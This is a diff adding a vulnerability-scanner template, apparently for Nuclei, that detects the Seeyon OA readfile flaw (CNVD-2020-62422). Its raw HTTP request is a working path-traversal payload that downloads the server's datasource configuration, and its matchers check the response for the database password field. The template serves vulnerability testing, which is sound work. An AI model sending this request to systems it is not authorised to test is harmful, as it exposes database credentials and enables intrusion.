@@ -1,0 +1,28 @@
+id: seeyon-readfile-cnvd-2020-62422
+info:
+  name: Seeyon Readfile Vulnerability (CNVD-2020-62422)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template identifies the Seeyon readfile vulnerability (CNVD-2020-62422), which allows attackers to access sensitive configuration files.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-62422
+http:
+  - raw:
+      - |
+        GET /seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties HTTP/1.1
+        Host: {{Hostname}}
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/x-msdownload"
+      - type: word
+        part: body
+        words:
+          - "ctpDataSource.password"
